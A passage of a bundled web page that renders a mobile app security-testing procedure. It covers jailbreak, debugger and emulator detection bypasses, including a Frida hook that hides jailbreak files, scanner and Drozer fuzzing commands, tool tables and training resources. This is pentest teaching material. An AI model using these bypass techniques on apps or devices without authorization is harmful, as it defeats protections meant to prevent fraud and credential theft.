Jailbroken\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Fork() restriction:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-objective-c",children:"if (fork() >= 0) {\n    // Jailbroken (sandboxed apps can't fork)\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass with Frida:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// iOS jailbreak detection bypass:\nvar fopen = new NativeFunction(Module.findExportByName(null, 'fopen'), 'pointer', ['pointer', 'pointer']);\nInterceptor.replace(fopen, new NativeCallback(function(path, mode) {\n    var pathStr = Memory.readUtf8String(path);\n    if (pathStr.indexOf(\"Cydia\") !== -1 || pathStr.indexOf(\"/bin/bash\") !== -1) {\n        console.log(\"[+] Hiding jailbreak file: \" + pathStr);\n        return ptr(0);  // Pretend file doesn't exist\n    }\n    return fopen(path, mode);\n}, 'pointer', ['pointer', 'pointer']));\n"})}),"\n",(0,r.jsx)(n.h3,{id:"debugger-detection-bypass",children:"Debugger Detection Bypass"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android debugger detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:"// Check if debugger attached:\nif (Debug.isDebuggerConnected()) {\n    // Debugger detected\n}\n\n// Check debuggable flag:\nif ((getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0) {\n    // App is debuggable\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"iOS debugger detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"// Check for debugger via sysctl:\n#include <sys/sysctl.h>\n\nint mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};\nstruct kinfo_proc info;\nsize_t size = sizeof(info);\nsysctl(mib, 4, &info, &size, NULL, 0);\n\nif (info.kp_proc.p_flag & P_TRACED) {\n    // Debugger attached\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Patch binary to remove checks (static analysis)"}),"\n",(0,r.jsx)(n.li,{children:"Hook detection functions with Frida (dynamic)"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"emulatorsimulator-detection-bypass",children:"Emulator/Simulator Detection Bypass"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Android emulator detection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-java",children:'// Check for emulator properties:\nString brand = Build.BRAND;  // "generic" on emulators\nString device = Build.DEVICE;  // "generic" on emulators\nString model = Build.MODEL;  // "sdk" on emulators\n\n// Check for Genymotion:\nif (Build.PRODUCT.contains("vbox")) {\n    // Genymotion emulator\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Bypass:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Modify build.prop on emulator:\nadb root\nadb remount\nadb shell\n\nvi /system/build.prop\n# Change:\n# ro.build.product=generic -> ro.build.product=OnePlus7\n# ro.product.model=sdk -> ro.product.model=OnePlus 7\n\nreboot\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"automated-testing",children:"Automated Testing"}),"\n",(0,r.jsx)(n.h3,{id:"mobile-app-scanners",children:"Mobile App Scanners"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"QARK (Quick Android Review Kit):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install QARK:\npip3 install qark\n\n# Analyze APK:\nqark --apk app.apk\n\n# Output: Vulnerability report (manifest issues, code vulnerabilities, etc.)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"MobSF (Mobile Security Framework):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# See Android/iOS Static Analysis sections for setup\n\n# Features:\n# - Automated vulnerability scanning\n# - Code analysis (SAST)\n# - Binary analysis\n# - API testing (dynamic)\n# - Report generation\n"})}),"\n",(0,r.jsx)(n.h3,{id:"automated-fuzzing",children:"Automated Fuzzing"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Drozer (Android Intent fuzzing):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Install Drozer:\n# https://github.com/FSecureLABS/drozer\n\n# Install agent APK on device:\nadb install drozer-agent.apk\n\n# Start drozer server on device (via agent app)\n\n# Connect from computer:\ndrozer console connect\n\n# List attack surface:\ndz> run app.package.attacksurface com.example.app\n\n# Output:\n# Exported Activities: 3\n# Exported Services: 1\n# Exported Broadcast Receivers: 2\n\n# Fuzz exported components:\ndz> run app.activity.start --component com.example.app com.example.app.PaymentActivity --extra string amount "0.01"\n'})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"tools-reference",children:"Tools Reference"}),"\n",(0,r.jsx)(n.h3,{id:"android-tools",children:"Android Tools"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Tool"}),(0,r.jsx)(n.th,{children:"Purpose"}),(0,r.jsx)(n.th,{children:"Platform"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"JADX"})}),(0,r.jsx)(n.td,{children:"APK decompiler (DEX to Java)"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Apktool"})}),(0,r.jsx)(n.td,{children:"APK decoder/rebuilder (smali)"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"MobSF"})}),(0,r.jsx)(n.td,{children:"Automated security testing"}),(0,r.jsx)(n.td,{children:"Web-based"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Frida"})}),(0,r.jsx)(n.td,{children:"Dynamic instrumentation"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Objection"})}),(0,r.jsx)(n.td,{children:"Frida REPL for mobile"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Drozer"})}),(0,r.jsx)(n.td,{children:"Android security assessment"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"AndroBugs"})}),(0,r.jsx)(n.td,{children:"Static analyzer"}),(0,r.jsx)(n.td,{children:"Linux"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"QARK"})}),(0,r.jsx)(n.td,{children:"Quick security scanner"}),(0,r.jsx)(n.td,{children:"Linux"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"adb"})}),(0,r.jsx)(n.td,{children:"Android Debug Bridge"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"ios-tools",children:"iOS Tools"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Tool"}),(0,r.jsx)(n.th,{children:"Purpose"}),(0,r.jsx)(n.th,{children:"Platform"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"frida-ios-dump"})}),(0,r.jsx)(n.td,{children:"Decrypt App Store IPAs"}),(0,r.jsx)(n.td,{children:"Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Clutch"})}),(0,r.jsx)(n.td,{children:"Decrypt IPAs (alternative)"}),(0,r.jsx)(n.td,{children:"iOS (jailbroken)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"class-dump"})}),(0,r.jsx)(n.td,{children:"Extract Objective-C headers"}),(0,r.jsx)(n.td,{children:"macOS/Linux"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Hopper"})}),(0,r.jsx)(n.td,{children:"Disassembler/decompiler"}),(0,r.jsx)(n.td,{children:"macOS/Linux"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"MobSF"})}),(0,r.jsx)(n.td,{children:"Automated security testing"}),(0,r.jsx)(n.td,{children:"Web-based"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Frida"})}),(0,r.jsx)(n.td,{children:"Dynamic instrumentation"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Objection"})}),(0,r.jsx)(n.td,{children:"Frida REPL for mobile"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"SSL Kill Switch"})}),(0,r.jsx)(n.td,{children:"Bypass SSL pinning"}),(0,r.jsx)(n.td,{children:"iOS (Cydia)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Keychain-Dumper"})}),(0,r.jsx)(n.td,{children:"Extract Keychain items"}),(0,r.jsx)(n.td,{children:"iOS (jailbroken)"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"iMAS"})}),(0,r.jsx)(n.td,{children:"Source code scanner"}),(0,r.jsx)(n.td,{children:"macOS"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"multi-platform-tools",children:"Multi-Platform Tools"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Tool"}),(0,r.jsx)(n.th,{children:"Purpose"}),(0,r.jsx)(n.th,{children:"Platform"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Burp Suite"})}),(0,r.jsx)(n.td,{children:"HTTPS interception/fuzzing"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Ghidra"})}),(0,r.jsx)(n.td,{children:"Binary analysis (ARM/x86)"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"IDA Pro"})}),(0,r.jsx)(n.td,{children:"Disassembler (commercial)"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Frida"})}),(0,r.jsx)(n.td,{children:"Runtime hooking"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Radare2"})}),(0,r.jsx)(n.td,{children:"RE framework"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:(0,r.jsx)(n.strong,{children:"Wireshark"})}),(0,r.jsx)(n.td,{children:"Network traffic analysis"}),(0,r.jsx)(n.td,{children:"Win/Linux/macOS"})]})]})]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"learning-resources",children:"Learning Resources"}),"\n",(0,r.jsx)(n.h3,{id:"documentation",children:"Documentation"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OWASP Mobile Security Testing Guide (MSTG):"})," ",(0,r.jsx)(n.a,{href:"https://owasp.org/www-project-mobile-security-testing-guide/",children:"https://owasp.org/www-project-mobile-security-testing-guide/"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OWASP Mobile Top 10:"})," ",(0,r.jsx)(n.a,{href:"https://owasp.org/www-project-mobile-top-10/",children:"https://owasp.org/www-project-mobile-top-10/"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Android Security Documentation:"})," ",(0,r.jsx)(n.a,{href:"https://source.android.com/security",children:"https://source.android.com/security"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"iOS Security Guide:"})," ",(0,r.jsx)(n.a,{href:"https://www.apple.com/business/docs/iOS_Security_Guide.pdf",children:"https://www.apple.com/business/docs/iOS_Security_Guide.pdf"})]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"books",children:"Books"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Mobile Application Penetration Testing"})," by Vijay Kumar"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Android Hacker's Handbook"})," by Joshua J. Drake et al."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"iOS Hacker's Handbook"})," by Charlie Miller et al."]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"The Mobile Application Hacker's Handbook"})," by Dominic Chell et al."]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"online-courses",children:"Online Courses"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Mobile Application Security and Penetration Testing (eLearnSecurity eMAPT)"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"SANS SEC575: Mobile Device Security and Ethical Hacking"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.strong,{children:"Pentester Academy: Mobile Security"})}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"practice-apps",children:"Practice Apps"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"DVIA (Damn Vulnerable iOS App):"})," ",(0,r.jsx)(n.a,{href:"https://github.com/prateek147/DVIA-v2",children:"https://github.com/prateek147/DVIA-v2"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"InsecureBankv2 (Android):"})," ",(0,r.jsx)(n.a,{href:"https://github.com/dineshshetty/Android-InsecureBankv2",children:"https://github.com/dineshshetty/Android-InsecureBankv2"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"AndroGoat (Android):"})," ",(0,r.jsx)(n.a,{href:"https://github.com/satishpatnayak/AndroGoat",children:"https://github.com/satishpatnayak/AndroGoat"})]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"OWASP iGoat (iOS):"})," ",(0,r.jsx)(n.a,{href:"https://github.com/OWASP/igoat",children:"https://github.com/OWASP/igoat"})]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"related-sops",children:"Related SOPs"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Analysis:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-reverse-engineering",children:"Reverse Engineering"})," - Mobile binary analysis (APK/IPA reverse engineering)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-cryptography-analysis",children:"Cryptography Analysis"})," - SSL pinning, certificate analysis, crypto failures"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-malware-analysis",children:"Malware Analysis"})," - Malicious mobile app analysis"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Pentesting & Security:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-web-application-security",children:"Web Application Security"})," - Mobile API and backend testing"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-firmware-reverse-engineering",children:"Firmware Reverse Engineering"})," - IoT and embedded mobile device analysis"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-vulnerability-research",children:"Vulnerability Research"})," - Finding mobile platform vulnerabilities"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-bug-bounty",children:"Bug Bounty Hunting"})," - Responsible mobile app vulnerability disclosure"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Pentesting/sop-detection-evasion-testing",children:"Detection Evasion Testing"})," - Bypassing mobile security controls"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.a,{href:"../../Security/Analysis/sop-forensics-investigation",children:"Forensics Investigation"})," - Mobile device forensics"]}),"\n"]})]})}function p(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},28453:(e,n,i)=>{i.d(n,{R:()=>a,x:()=>l});var s=i(96540);const r={},t=s.createContext(r);function a(e){const n=s.useContext(t);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(t.Provider,{value:n},e.children)}}}]);